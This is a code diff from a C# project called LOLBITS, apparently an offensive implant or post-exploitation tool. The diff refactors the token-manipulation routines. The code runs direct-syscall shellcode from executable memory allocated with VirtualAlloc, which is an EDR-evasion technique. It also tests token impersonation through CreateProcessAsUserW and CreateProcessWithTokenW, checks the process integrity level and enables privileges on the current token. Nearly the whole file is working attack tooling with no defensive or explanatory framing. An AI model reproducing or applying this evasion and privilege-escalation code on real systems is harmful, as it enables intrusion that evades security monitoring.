@@ -382,7 +382,9 @@ namespace LOLBITS
             var arguments = new object[] { handle, access, token };
             var returnValue = sysCallDelegate.DynamicInvoke(arguments);
 
-            currentToken = (IntPtr)arguments[2];
+
+            currentToken = (int)returnValue == 0 ? (IntPtr)arguments[2] : IntPtr.Zero;
+
         }
 
         public static void DuplicateToken(IntPtr token, TokenAccessFlags tokenAccess, SecurityImpersonationLevel se, TokenType type, out IntPtr duplicated)
@@ -394,10 +396,10 @@ namespace LOLBITS
         public static void DetermineImpersonationMethod(IntPtr token, LogonFlags l, StartupInfo startupInfo, out ProcessInformation processInfo)
 
         {
-            if (CreateProcessAsUserW(token, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
+            if (CreateProcessAsUserW(token, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, null, ref startupInfo, out processInfo))
                 TokenManager.Method = 1;
             else 
-            if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C echo hi && exit", 0,
+            if (CreateProcessWithTokenW(token, l, null, @"c:\windows\system32\cmd.exe /Q /C hostname && exit", 0,
                 IntPtr.Zero, null, ref startupInfo, out processInfo))
                 TokenManager.Method = 2;
         }
@@ -405,23 +407,17 @@ namespace LOLBITS
         // Code from https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
         public static bool IsHighIntegrity(SysCallManager sysCall)
         {
-            var pId = (Process.GetCurrentProcess().Handle);
+            var pHandle = (Process.GetCurrentProcess().Handle);
 
             var hToken = IntPtr.Zero;
 
-            var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
-            var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellCode.Length, MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve, MemoryProtectionFlags.ExecuteReadWrite);
-            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
-            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
-            var token = IntPtr.Zero;
-            var arguments = new object[] { pId, TokenAccessFlags.TokenQuery, token };
-            var returnValue = sysCallDelegate.DynamicInvoke(arguments);
+            GetProcessToken(pHandle, Utils.TokenAccessFlags.TokenDuplicate, out hToken,
+                    sysCall);
 
-            if ((int) returnValue != 0) return false;
+            if (hToken == IntPtr.Zero) return false;
 
             try
             {
-                hToken = (IntPtr)arguments[2];
                 var pb = Marshal.AllocCoTaskMem(1000);
                 try
                 {
@@ -464,19 +460,21 @@ namespace LOLBITS
                 };
 
 
-                var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
-                var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
-                    MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve,
-                    MemoryProtectionFlags.ExecuteReadWrite);
-                Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
-                var sysCallDelegate =
-                    Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
-                var t = IntPtr.Zero;
+                /* var shellCode = sysCall.GetSysCallAsm("NtOpenProcessToken");
+                 var shellCodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr) shellCode.Length,
+                     MemoryAllocationFlags.Commit | MemoryAllocationFlags.Reserve,
+                     MemoryProtectionFlags.ExecuteReadWrite);
+                 Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+                 var sysCallDelegate =
+                     Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtOpenProcessToken));
                 var arguments = new object[]
                     {Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, t};
-                var returnValue = sysCallDelegate.DynamicInvoke(arguments);
+                var returnValue = sysCallDelegate.DynamicInvoke(arguments);*/
 
-                var currentToken = (IntPtr) arguments[2];
+                var currentToken = IntPtr.Zero;
+                GetProcessToken(Process.GetCurrentProcess().Handle, TokenAccessFlags.TokenAdjustPrivileges, out currentToken,
+                    sysCall);
+
                 EnablePrivileges(currentToken, privileges);
 
                 CloseHandle(currentToken);
